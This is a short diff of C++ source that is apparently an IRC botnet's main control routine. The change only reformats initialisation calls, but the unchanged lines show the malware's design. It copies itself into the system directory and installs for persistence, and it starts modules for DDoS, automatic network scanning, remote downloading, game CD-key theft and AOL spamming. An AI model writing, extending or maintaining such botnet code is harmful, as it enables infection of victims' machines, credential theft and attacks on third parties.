@@ -74,7 +74,9 @@ int CMainCtrl::Main(const char *szCmdLine, const char *szArgv0)
 	CThread::InitPThreads();
 
 	// Initialize base subsystems, don't swap
-	m_cCVar.Init(); m_cMac.Init(); m_cBot.Init();
+	m_cCVar.Init();
+	m_cMac.Init();
+        m_cBot.Init();
 	
 	if(m_cBot.as_enabled.bValue) m_cInstaller.CopyToSysDir(m_cBot.bot_filename.sValue);
 	m_cInstaller.Install();
@@ -98,8 +100,13 @@ int CMainCtrl::Main(const char *szCmdLine, const char *szArgv0)
 	m_cIRC.Start(); m_cSendFile.Start();
 
 	// Initialize subsystems
-	m_cIRC.Init(); m_cDownloader.Init(); m_cScanner.Init(); m_cDDOS.Init();
-	m_cRedirect.Init(); m_cCDKeyGrab.Init(); m_cScannerAuto.Init();
+	m_cIRC.Init();
+	m_cDownloader.Init();
+	m_cScanner.Init();
+	m_cDDOS.Init();
+	m_cRedirect.Init();
+        m_cCDKeyGrab.Init();
+        m_cScannerAuto.Init();
 	m_cRSLControl.Init();
 	if(m_cBot.spam_aol_enabled.bValue) m_bCanSpamAOL=CanSpamAOL();
 
